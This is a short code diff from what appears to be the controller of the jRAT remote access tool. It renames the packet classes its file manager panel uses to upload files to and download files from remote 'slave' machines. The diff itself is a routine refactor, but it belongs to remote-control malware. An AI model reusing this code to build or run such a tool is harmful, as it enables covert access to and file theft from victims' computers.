@@ -13,7 +13,8 @@ import jrat.controller.packets.outgoing.*;
 import jrat.controller.utils.Utils;
 import jrat.module.fs.FileSystem;
 import jrat.module.fs.packets.Packet15ListFiles;
-import jrat.module.fs.packets.Packet42ServerUploadFile;
+import jrat.module.fs.packets.download.Packet21Download;
+import jrat.module.fs.packets.upload.Packet42Upload;
 import jrat.module.fs.packets.Packet47RenameFile;
 import jrat.module.fs.ui.previews.PanelPreviewArchive;
 import jrat.module.fs.ui.previews.PanelPreviewFile;
@@ -70,7 +71,7 @@ public class PanelFileManager extends FileSubPanel {
 			
 			listRoots();
 			
-			JButton btnUpload = new JButton("Upload");
+			JButton btnUpload = new JButton("upload");
 			btnUpload.setIcon(Resources.getIcon("arrow-up"));
 			btnUpload.addActionListener(new ActionListener() {
 				@Override
@@ -171,7 +172,7 @@ public class PanelFileManager extends FileSubPanel {
 		public void upload() {
 			for (FileObject s : getSelectedItems()) {
 				File file = new File(s.getPath());
-				slave.addToSendQueue(new Packet42ServerUploadFile(file, remoteTable.getCurrentDirectory() + file.getName()));
+				slave.addToSendQueue(new Packet42Upload(file, remoteTable.getCurrentDirectory() + file.getName()));
 			}
 			
 			if (getSelectedItems().length > 0) {
@@ -528,7 +529,7 @@ public class PanelFileManager extends FileSubPanel {
 					}
 					PanelFileTransfers.instance.add(data);
 					FileCache.put(fo.getPath(), data);
-					slave.addToSendQueue(new Packet21ServerDownloadFile(fo.getPath()));
+					slave.addToSendQueue(new Packet21Download(fo.getPath()));
 					getParentPanel().setTab(PanelFileTransfers.instance);
 				}
 			}
